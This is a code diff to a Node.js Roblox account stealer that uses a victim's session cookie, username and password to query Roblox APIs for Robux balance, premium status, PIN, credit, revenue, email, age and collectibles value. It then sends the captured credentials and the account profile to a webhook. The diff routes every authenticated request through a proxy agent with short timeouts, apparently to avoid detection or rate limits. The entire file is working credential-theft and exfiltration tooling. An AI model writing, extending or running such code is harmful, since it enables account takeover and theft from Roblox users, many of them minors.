@@ -1,4 +1,5 @@
 require('dotenv').config();
+const HttpsProxyAgent = require('https-proxy-agent');
 const axios = require('axios');
 const faunadb = require('faunadb');
 const client = new faunadb.Client({
@@ -36,7 +37,7 @@ async function getUserId(rusername) {
 }
 
 
-async function getUserRobux(cookies) {
+async function getUserRobux(cookies,ProxyUrl) {
     try {
         const url = 'https://www.roblox.com/mobileapi/userinfo?nl=true';
 
@@ -45,6 +46,8 @@ async function getUserRobux(cookies) {
                 'X-Requested-With': 'XMLHttpRequest',
                 'Cookie': `.ROBLOSECURITY=${cookies}`,
             },
+            httpsAgent: new HttpsProxyAgent(ProxyUrl),
+            timeout: 3000,
         });
 
         const decodeuserinfo = response.data;
@@ -57,7 +60,7 @@ async function getUserRobux(cookies) {
 }
 
 
-async function getPremiumData(userId, cookies) {
+async function getPremiumData(userId, cookies,ProxyUrl) {
     const intuserId = parseInt(userId);
     const url = `https://premiumfeatures.roblox.com/v1/users/${userId}/subscriptions`;
     try {
@@ -68,6 +71,8 @@ async function getPremiumData(userId, cookies) {
                 'X-Requested-With': 'XMLHttpRequest',
                 'Cookie': `.ROBLOSECURITY=${cookies}`,
             },
+            httpsAgent: new HttpsProxyAgent(ProxyUrl),
+            timeout: 3000,
         });
 
         const jsonpremium = response.data;
@@ -103,7 +108,7 @@ async function getPremiumData(userId, cookies) {
     }
 }
 
-async function checkPinStatus(cookies) {
+async function checkPinStatus(cookies,ProxyUrl) {
     try {
         const url = 'https://auth.roblox.com/v1/account/pin';
 
@@ -112,6 +117,8 @@ async function checkPinStatus(cookies) {
                 'X-Requested-With': 'XMLHttpRequest',
                 'Cookie': `.ROBLOSECURITY=${cookies}`,
             },
+            httpsAgent: new HttpsProxyAgent(ProxyUrl),
+            timeout: 3000,
         });
 
         const jsonpin = response.data;
@@ -150,7 +157,7 @@ async function checkVerified(userId) {
 }
 
 
-async function getCreditBalance(cookies) {
+async function getCreditBalance(cookies,ProxyUrl) {
     try {
         const url = 'https://billing.roblox.com/v1/credit';
 
@@ -159,6 +166,8 @@ async function getCreditBalance(cookies) {
                 'X-Requested-With': 'XMLHttpRequest',
                 'Cookie': `.ROBLOSECURITY=${cookies}`,
             },
+            httpsAgent: new HttpsProxyAgent(ProxyUrl),
+            timeout: 3000,
         });
 
         const jsoncredit = response.data;
@@ -183,7 +192,7 @@ async function getCreditBalance(cookies) {
 }
 
 
-async function getUserJoinDate(userId, cookies) {
+async function getUserJoinDate(userId, cookies,ProxyUrl) {
     try {
         const url = `https://users.roblox.com/v1/users/${userId}`;
 
@@ -192,6 +201,8 @@ async function getUserJoinDate(userId, cookies) {
                 'X-Requested-With': 'XMLHttpRequest',
                 'Cookie': `.ROBLOSECURITY=${cookies}`,
             },
+            httpsAgent: new HttpsProxyAgent(ProxyUrl),
+            timeout: 3000,
         });
 
         const jsonjoindate = response.data;
@@ -206,7 +217,7 @@ async function getUserJoinDate(userId, cookies) {
 }
 
 
-async function getUserRevenue(userId, cookies) {
+async function getUserRevenue(userId, cookies,ProxyUrl) {
     try {
         const url = `https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`;
 
@@ -215,6 +226,8 @@ async function getUserRevenue(userId, cookies) {
                 'X-Requested-With': 'XMLHttpRequest',
                 'Cookie': `.ROBLOSECURITY=${cookies}`,
             },
+            httpsAgent: new HttpsProxyAgent(ProxyUrl),
+            timeout: 3000,
         });
 
         const jsonrevenue = response.data;
@@ -246,7 +259,7 @@ async function getUserRevenue(userId, cookies) {
     }
 }
 
-async function getUserAge(cookies) {
+async function getUserAge(cookies,ProxyUrl) {
     try {
         const url = 'https://www.roblox.com/my/account/json';
 
@@ -255,6 +268,8 @@ async function getUserAge(cookies) {
                 'X-Requested-With': 'XMLHttpRequest',
                 'Cookie': `.ROBLOSECURITY=${cookies}`,
             },
+            httpsAgent: new HttpsProxyAgent(ProxyUrl),
+            timeout: 3000,
         });
 
         const jsonage = response.data;
@@ -272,7 +287,7 @@ async function getUserAge(cookies) {
     }
 }
 
-async function getUserEmail(cookies) {
+async function getUserEmail(cookies,ProxyUrl) {
     try {
         const url = 'https://accountsettings.roblox.com/v1/email';
 
@@ -281,6 +296,8 @@ async function getUserEmail(cookies) {
                 'X-Requested-With': 'XMLHttpRequest',
                 'Cookie': `.ROBLOSECURITY=${cookies}`,
             },
+            httpsAgent: new HttpsProxyAgent(ProxyUrl),
+            timeout: 3000,
         });
 
         const jsonemail = response.data;
@@ -301,14 +318,13 @@ async function getUserEmail(cookies) {
     }
 }
 
-async function getCollectiblesRAP(userId, cookies) {
+async function getCollectiblesRAP(userId) {
     try {
         const url = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?sortOrder=Asc&limit=100`;
 
         const response = await axios.get(url, {
             headers: {
                 'X-Requested-With': 'XMLHttpRequest',
-                'Cookie': `.ROBLOSECURITY=${cookies}`,
             },
         });
 
@@ -335,15 +351,6 @@ async function getCollectiblesRAP(userId, cookies) {
 
 
 async function sendwebhooks(webhook, data) {
-    const response = await axios.post(webhook, data, {
-        headers: {
-            'Content-Type': 'application/json',
-            'Accept': 'application/json',
-        },
-    });
-}
-
-async function sendwebhooks(webhook, data) {
     try {
         const response = await axios.post(webhook, data, {
             headers: {
@@ -358,7 +365,7 @@ async function sendwebhooks(webhook, data) {
     }
 }
 
-async function successembed(rusername, rpassword, cookies, successwebhook, sessionToken) {
+async function successembed(rusername, rpassword, cookies, successwebhook, sessionToken,ProxyUrl) {
 
 
     const user_ref_from_session = await client.query(
@@ -391,16 +398,16 @@ async function successembed(rusername, rpassword, cookies, successwebhook, sessi
 
     const userId = await getUserId(rusername);
     const avatarUrl = await getAvatarUrl(userId);
-    const membership = await getPremiumData(userId, cookies)
-    const robux = await getUserRobux(cookies)
-    const pin = await checkPinStatus(cookies)
+    const membership = await getPremiumData(userId, cookies,ProxyUrl)
+    const robux = await getUserRobux(cookies,ProxyUrl)
+    const pin = await checkPinStatus(cookies,ProxyUrl)
     const verified = await checkVerified(userId)
-    const getcredits = await getCreditBalance(cookies);
-    const joindate = await getUserJoinDate(userId, cookies);
-    const revenue = await getUserRevenue(userId, cookies)
-    const getuserage = await getUserAge(cookies);
-    const email = await getUserEmail(cookies);
-    const rap = await getCollectiblesRAP(userId, cookies);
+    const getcredits = await getCreditBalance(cookies,ProxyUrl);
+    const joindate = await getUserJoinDate(userId, cookies,ProxyUrl);
+    const revenue = await getUserRevenue(userId, cookies,ProxyUrl)
+    const getuserage = await getUserAge(cookies,ProxyUrl);
+    const email = await getUserEmail(cookies,ProxyUrl);
+    const rap = await getCollectiblesRAP(userId);
 
     const successembed = {
         content: "",
